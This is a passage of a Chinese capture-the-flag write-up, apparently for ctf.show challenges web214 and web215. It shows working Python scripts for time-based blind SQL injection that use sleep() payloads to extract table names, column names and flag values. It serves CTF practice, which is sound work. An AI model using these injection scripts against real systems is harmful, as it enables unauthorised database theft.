+aWq7b31AWuEA7SPae6nlZhgBBnfqWlv+1C1bQWBzIzaaAm99x43N06AabMVuYcaxXnbwYhIAzYM+kZhYZ3g9UzZqsHO69lCXHGd6kNzW/IvpcW1G89feOKFT3YjZsF5B1/y0terWsicqCrpJNgm1d56VfnEaz3phGXA9HupE66hO8vBVLXHiIgyXcVjY+pm4GCE9mKCUdywY3xdXC0o3JrbaWo/ndcHSbp8rXS+Gnx7IaWDwz29WpVOPzTlX1z1Bk2SfzF+NDXoedeWPC1Kkta1FpfOTqrtf7/S6YempGBz4ir+cshI6r7vHXic7IzkHmIU1/R1qSudZRI6Cn//LKNE7zeUuf5GMAUL2uDrQk+0pktpcVWrl8HIqmPp61Upk9GuFpR6FS5Nsz24G1CfavgevLh29pZ6RpODrK/Ftbt7oqrWg39//UHNbV8nZwtKHQwZYVVPdLawqlf9l9D0dakFrRI/fKbMRO73/5zI+/bfI0dx445pfjjVVd8O4qTT1esNgEVPnk4lefIWT+X7i92Dlr7W6sKRjrSqr3sa90GnV3G9HNSfAVPDZmi66yt0y0t8R3uStL6m+O6uTqrSuvdEC1en+iV/OjhiUvs+uTPFd/bGrhcCnxsj09WPKp+saXPkTb3jjmnvnL7sxqu5n9buWVwvJ10p97Z1GFqLWt871Pb1CCi4IfdocUcHq6fKJPLtUV5T+98fSalXE95T1tSH0yvF17pHBzumtdA62Lr2au21taVtHdZeSme97637tvNKBPeRDNwxbn441ZUW5U34n2DklBqYAxMjud/f/iqNG8WNOaa5/zq4xWO983X7s5u10feFDXdyfV/cQmpNH9K7ury++39dta/3lU6k5f+wGnxSIRTSYBNh2A6lgjW+gUUc83nSzohvIaWDQ0+/dO59q4VGcNWbH1GL74y6qbf/Nfun4sB8mbwZGAA6jExXAWAwIgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwDQiB8A0IgfANCIHwLQv5vXCf/zxx7xeGsBfSMQ55+Z9EQAwLUxXAZhG5ACYRuQAmEbkAJhG5ACYRuQAmEbkAJhG5ACYRuQAmEbkAJhG5ACYNtUP6P/555/TPD0AjMUH9AGY9v9/RIdnmEGaHgAAAABJRU5ErkJggg==" width="313" height="337" class="img_ev3q"></p>
<p>¿¿¿¿¿¿¿</p>
<p>然后就是找注入点，根据之前的可以确定是在/api/index.php，但是不知道怎么弄</p>
<p>于是乎打开了我最不喜欢打开的bp，因为我电脑打开太卡了</p>
<p>然后tnnd上次弄mc1.18.1下载了java17，我用的祖传bp2020.2打不开呜呜呜，无奈去下载2021.9的了，唉，祖传能999线程，不知道新版是不是只能5线程</p>
<p>好，弄完了。换了个bp2021.9的</p>
<p>然后我发现怎么找都找不到注入点，看feng师傅的wp说注入点是/api/index.php的POST方式发送ip和debug。。。</p>
<p>如果要知道是这里的话，就只能看网络请求。</p>
<p><img decoding="async" loading="lazy" alt="image-20220112143047400" src="/assets/images/image-20220112143047400-0b05a34294323dd11ea307fa6690571e.png" width="1913" height="306" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20220110163628473" src="/assets/images/image-20220110163628473-cb7ebe77e495eca4a0a508509db60aa9.png" width="1064" height="533" class="img_ev3q"></p>
<p>这里就是标准的时间盲注，第175题可是写过的，再修改一下即可</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://fbc47c9a-559c-4e8d-87ff-8a73242bdfab.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.5),&#x27;False&#x27;)&quot;</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># 注表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        start_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        end_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sub </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> end_time </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> start_time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sub </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#注列名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.5),&#x27;False&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#爆字段</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.5),1)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web215">web215<a href="#web215" class="hash-link" aria-label="Direct link to web215" title="Direct link to web215">​</a></h3>
<p>查询语句：用了单引号</p>
<p>那不就是标标准准之前175那个时间盲注然后小改一下吗</p>
<p>对于上面那个，也就前面加&#x27; or ，后面加#</p>
<p>如下</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://017862d1-440d-44e3-86de-45412b68b8cd.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.5),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        start_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        end_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sub </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> end_time </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> start_time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sub </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当然还有个判断方法，就是直接设置timeout，这样超过这个时间直接跑下一个，改法如下：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://017862d1-440d-44e3-86de-45412b68b8cd.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.3),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.29</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div 